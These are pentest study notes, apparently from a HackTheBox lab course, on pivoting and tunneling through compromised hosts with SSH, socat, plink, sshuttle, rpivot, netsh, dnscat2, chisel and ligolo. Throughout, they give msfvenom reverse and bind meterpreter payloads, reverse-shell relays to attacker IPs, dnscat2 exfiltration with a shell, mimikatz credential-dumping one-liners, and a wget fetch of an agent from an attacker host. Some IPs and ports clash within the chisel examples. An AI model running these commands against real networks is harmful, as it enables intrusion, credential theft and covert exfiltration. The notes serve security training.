
---

# Dynamic Port Forwarding with SSH and SOCKS Tunneling


`Port forwarding` is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.

##  SSH Local Port Forwarding  

Scanning the Pivot Target

```bash
c4ndy@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64
PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql
```

Executing the Local Port Forward 

```shell
c4ndy@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

Confirm Port Forward with Netstat

```shell
c4ndy@htb[/htb]$ netstat -antp | grep 1234
```

Confirming Port Forward with Nmap

```shell
c4ndy@htb[/htb]$ nmap -v -sV -p1234 localhost
```

Forwarding Multiple Ports

```shell
c4ndy@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

---

#  SSH Dynamic Port Forwarding 

**Dynamic Port Forwarding** is a more flexible and automatic method, typically used with protocols like SSH (Secure Shell). It allows for the creation of a dynamic tunnel that forwards traffic through a single port, but the destination ports can vary.

- **Dynamic Port Forwarding**: Involves setting up a local proxy server (such as with `ssh -D`) that listens on a local port. This proxy server can then forward traffic dynamically to different remote destinations based on the traffic’s destination addresses and ports.
- **Use Case**: It's commonly used for situations where you want to tunnel traffic through an SSH connection, allowing you to access various services on remote servers or bypass network restrictions. It's often employed for web browsing through a secure tunnel (e.g., SSH SOCKS proxy).

###### Scanning the Pivot Target

```shell
c4ndy@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

```shell
c4ndy@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
```

Checking /etc/proxychains.conf

```shell
c4ndy@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

Using Nmap with Proxychains

```c
c4ndy@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0

<SNIP>
```

# Using Metasploit with Proxychains

```shell
c4ndy@htb[/htb]$ proxychains msfconsole
```

---

# Reverse Port Forwarding with SSH


With reverse port forwarding, if you establish a reverse shell from Victim B to Victim A and set up port forwarding on Victim A to your attack machine, you'll be able to access the shell from your machine. This way, Victim A acts as an intermediary to route the connection from Victim B to your attack machine.\
![[Pasted image 20240825035409.png]]


#### Creating a Windows Payload with msfvenom


1 . Attacker Machine Create reverse shell  and start a multi handler on port 8080

```shell
c4ndy@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

1. transfer the reverse shell to the victim server  ( ubuntu )
2. Transfer the file to the Victim Server ( windows A ) or make a exploit 
3. Make the SSH Reverse Port Forwarding

```shell
c4ndy@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

and execute the reverse shell : ) 


---

Meterpreter Port Forwarding 

https://pentest.blog/explore-hidden-networks-with-double-pivoting/
https://www.offsec.com/metasploit-unleashed/portfwd/


---

# Socat Redirection with a Reverse Shell


[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start `socat` on the Ubuntu server.

#### Starting Socat Listener ( from the compromised server)

```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

#### Creating a Reverse Shell

```shell
c4ndy@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

And we can run multi/hander on port  80 

---
# Socat Redirection with Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.

![](https://academy.hackthebox.com/storage/modules/158/55.png)

#### Creating the Windows Payload

```shell
c4ndy@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.

#### Starting Socat Bind Shell Listener

```c
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

#### Configuring & Starting the Bind multi/handler

```shell
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

# Note : 

the main idea , it will be like a middle server , the compromised server will listen and send

---

# SSH for Windows:plink.exe (Putty Link)

[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html), short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of [2018](https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview), Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was [PuTTY](https://www.putty.org/).


```bash
Note : 
Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer.
```

The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

#### Using Plink.exe

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

```c
.\plink.exe root@192.168.1.11 -R 445:127.0.0.1:445
```

---

# SSH Pivoting with Sshuttle

#### install sshuttle

```bash
c4ndy@htb[/htb]$ sudo apt-get install sshuttle
```

To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

#### Running sshuttle

```shell
c4ndy@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

```shell
c4ndy@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

---

# web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

##### Download rpivot

```shell
c4ndy@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
```

###### install python2.7

```shell
c4ndy@htb[/htb]$ sudo apt-get install python2.7
```

##### Running server.py from the Attack Host

```shell
c4ndy@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

#####  Transfering rpivot to the Target

```shell
c4ndy@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

##### Running client.py from Pivot Target

```shell
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
Backconnecting to server 10.10.14.18 port 9999
```

##### Confirming Connection is Established

```shell
New connection from host 10.129.202.64, source port 35226
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

##### Browsing to the Target Webserver using Proxychains

```shell
proxychains firefox-esr 172.16.5.135:80
```


##### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

---

# Port Forwarding with Windows Netsh


##### Using Netsh.exe to Port Forward

```cmd
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

##### Verifying Port Forward

```cmd
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```

After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.

---

# DNS Tunneling with Dnscat2


[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.


##### Setting Up & Using dnscat2

If dnscat2 is not already set up on our attack host, we can do so using the following commands:
##### Cloning dnscat2 and Setting Up the Server


```shell
c4ndy@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

We can then start the dnscat2 server by executing the dnscat2 file.

##### Starting the dnscat2 server 

```shell
c4ndy@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

##### Cloning dnscat2-powershell to the Attack Host

```shell
c4ndy@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

We can list the options we have with dnscat2 by entering `?` at the prompt.

```shell
dnscat2> ?
```

We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.'

##### Interacting with the Established Session

```shell
dnscat2> window -i 1
```

---

# 

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

##### Transferring Chisel Binary to Pivot Host

```shell
c4ndy@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```

##### Running the Chisel Server on the Pivot Host 

```shell
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```

The Chisel listener will listen for incoming connections on port `1234`  using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

We can start a client on our attack host and connect to the Chisel server.

##### Connecting to the Chisel Server

```shell
c4ndy@htb[/htb]$ ./chisel client -v 192.168.193.141:1234 socks
```

As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

##### Editing & Confirming proxychains.conf

We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.



```c
c4ndy@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

##### Pivoting to the DC



```c
c4ndy@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Chisel Reverse Pivot

In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

We'll start the server in our attack host with the option `--reverse`.

##### Starting the Chisel Server on our Attack Host



```c
c4ndy@htb[/htb]$ sudo ./chisel server --reverse -v -p 2222 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

##### Connecting the Chisel Client to our Attack Host



```c
ubuntu@WEB01$ ./chisel client -v 192.168.45.220:5555 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

##### Editing & Confirming proxychains.conf

```c
c4ndy@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```c
c4ndy@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

```c
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

```c
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

```c
./mimikatz.exe  "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

---
---
# Pivoting Using Ligolo


> Victim Machine

```c
# 1 - File Transfer
wget http://10.10.14.9/lin-agent
chmod +x lin-agent
# ./lin-agent -connect 10.10.15.202:443 -ignore-cert

```

> Attackar Machine

```c
sudo ip tuntap add user balthazar mode tun ligolo
sudo ip link set ligolo up
./lin-proxy -selfcert -laddr 0.0.0.0:443
sudo ip route add 172.16.6.0/24 dev ligolo
```
---
---
